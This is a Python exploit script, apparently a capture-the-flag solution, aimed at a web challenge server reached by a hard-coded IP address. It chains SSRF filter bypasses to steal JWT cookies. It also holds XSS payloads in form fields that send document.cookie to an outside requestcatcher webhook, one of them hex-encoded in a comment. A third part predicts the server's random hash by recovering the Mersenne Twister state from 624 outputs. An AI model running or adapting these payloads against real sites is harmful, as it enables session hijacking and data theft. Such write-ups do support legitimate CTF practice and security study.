import httpx
from mt19937predictor import MT19937Predictor

URL = "http://77.37.47.226:1811"
# URL = "http://localhost:1811"

WEBHOOK = "https://demoaja.requestcatcher.com/get_flag_enc?c="

ENC_FLAG = "400d63a4cc4ba2fac3716bd29ebfc563"
demo = "http://youtube.com&@google.com#@wikipedia.com/"

host = '\\g\\o\\o\\g\\l\\e.c\\o\\m'

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url, timeout=60)
    def ssrf_and_get_jwt_by_hosts(self):
        r = self.c.post('/hosts', data={
            'host': host
        })
        self.simulate_adm2 = r.cookies.get('jwt2')
        print('ssrf /hosts bypassed, this the jwt : ', self.simulate_adm2)
    def ssrf_and_get_jwt_by_requests(self):
        r = self.c.post('/requests', data={
            'url': demo
        })
        self.simulate_adm1 = r.cookies.get('jwt')
        print('ssrf /requests bypassed, this the jwt : ', self.simulate_adm1)
    def submit(self):
        r = self.c.post('/check', data={
            'pop_rdi': 'about:blank', 
            'timeout':'60000',
        #   onmousedown="mouse_down()" <- because of this we can trigger xss when using mouseup but in playwright is no user interaction.
            'category':'mouseup', 
            # you can also use like this :) 
            # ",window.location.href = 'javascript:\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x64\x65\x6d\x6f\x61\x6a\x61\x2e\x72\x65\x71\x75\x65\x73\x74\x63\x61\x74\x63\x68\x65\x72\x2e\x63\x6f\x6d\x0a\x0a\x3f\x63\x3d\x27\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b\x61\x6c\x65\x72\x74\x28\x31\x29',"
            'my-headache':'Severe headache triggered by JS!',
            # why we trigger alert? to load the window location so it will not close
            'your-headache':f"\",window.location.href = '{WEBHOOK}'+document.cookie;new up_coming_features;//",
            # 'your-headache': f"\");location='javascript:alert\\x28\\'a\\'\\x29';//" # <-- you can use this to bypass ( 
            
            # for debug
            # 'your-headache':"fetch('http://localhost:1811/flag?flag=33671c99be5c1b5988f6d358f24093c4').then(r => r.text()).then(alert).catch(console.error);",
            # 'your-headache':"alert(document.cookie)",
            'number-selector':'1000',
            'number-happy':'-1000'
            })
        print(r.text)
        
    def get_flag(self,md5flag=ENC_FLAG):
        predictor = MT19937Predictor()

        for i in range(624):
            print('iteration : ', i)
            x = self.c.get('/debug?debug=1')
            predictor.setrandbits(int(x.json()['hash']), 32) 
        predicted = predictor.getrandbits(32)
        print('predict : ', predicted)
        r = self.c.get('/debug', params={
            'hash':predicted,
            'flag':md5flag
        })
        print(r.text)
        

        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    # api.get_flag()
    # api.ssrf_and_get_jwt_by_requests()
    # api.ssrf_and_get_jwt_by_hosts()
    # api.submit()
    # enc_flag = input('input md5 flag: ')
    # api.get_flag(enc_flag)
    api.get_flag()